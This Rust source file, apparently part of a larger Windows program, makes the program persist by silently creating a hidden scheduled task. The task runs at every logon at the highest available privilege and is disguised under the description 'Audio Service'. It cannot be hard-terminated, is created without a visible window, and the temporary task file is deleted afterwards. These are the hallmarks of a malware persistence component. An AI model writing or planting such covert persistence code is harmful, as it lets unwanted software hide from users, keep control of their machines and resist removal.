use crate::config::Config;
use anyhow::{Context, Result};
use std::env;
use std::fs;
use std::process::Command;
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x08000000;

pub async fn check_startup() -> Result<()> {
    let startup_config = Config::get_startup_config();

    if !startup_config.enabled {
        return Ok(());
    }

    setup_scheduled_task(&startup_config.task_name)
}

fn setup_scheduled_task(name: &str) -> Result<()> {
    let exe_path = env::current_exe()
        .context("Failed to get executable path")?
        .to_string_lossy()
        .to_string();

    if is_task_exists(name) {
        return Ok(());
    }

    let xml_content = format!(r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Audio Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{exe}</Command>
    </Exec>
  </Actions>
</Task>"#, exe = xml_escape(&exe_path));

    let temp_dir = env::temp_dir();
    let xml_path = temp_dir.join(format!("{}.xml", name));
    
    let mut bytes = vec![0xFF, 0xFE];
    for c in xml_content.encode_utf16() {
        bytes.push((c & 0xFF) as u8);
        bytes.push((c >> 8) as u8);
    }
    fs::write(&xml_path, &bytes)?;

    let output = Command::new("schtasks")
        .args([
            "/Create",
            "/TN", name,
            "/XML", &xml_path.to_string_lossy(),
            "/F"
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .context("Failed to create scheduled task")?;

    let _ = fs::remove_file(&xml_path);

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(anyhow::anyhow!("schtasks failed: {}", stderr));
    }

    Ok(())
}

fn xml_escape(s: &str) -> String {
    s.replace("&", "&amp;")
     .replace("<", "&lt;")
     .replace(">", "&gt;")
     .replace("\"", "&quot;")
     .replace("'", "&apos;")
}

pub fn remove_startup(name: &str) -> Result<()> {
    let _ = Command::new("schtasks")
        .args(["/Delete", "/TN", name, "/F"])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    Ok(())
}

pub fn is_startup_enabled(name: &str) -> bool {
    is_task_exists(name)
}

fn is_task_exists(name: &str) -> bool {
    let output = Command::new("schtasks")
        .args(["/Query", "/TN", name])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    match output {
        Ok(o) => o.status.success(),
        Err(_) => false,
    }
}
